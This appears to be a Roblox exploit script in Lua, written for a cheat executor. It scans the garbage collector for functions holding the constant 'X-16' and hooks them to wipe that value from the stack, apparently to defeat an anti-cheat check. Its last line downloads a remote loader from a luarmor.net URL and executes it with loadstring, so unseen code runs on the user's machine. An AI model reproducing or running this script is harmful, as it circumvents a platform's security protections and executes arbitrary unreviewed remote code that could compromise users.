for _, Value in next, getgc() do
    if type(Value) == "function" and islclosure(Value) then
        local Constants = getconstants(Value)

        if type(Constants) == "table" then
            for _, Constant in next, Constants do
                if Constant == "X-16" then
                    local OldHook

                    OldHook = hookfunction(Value, function(...)
                        local Stack = debug.getstack(1)

                        for Index, Value in next, Stack do
                            if Value == "X-16" then
                                debug.setstack(1, Index, nil)
                            end
                        end

                        return OldHook(...)
                    end)

                    break
                end
            end
        end
    end
end
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/24b5bd3aa14490d03cb0f5f52030a107.lua"))()
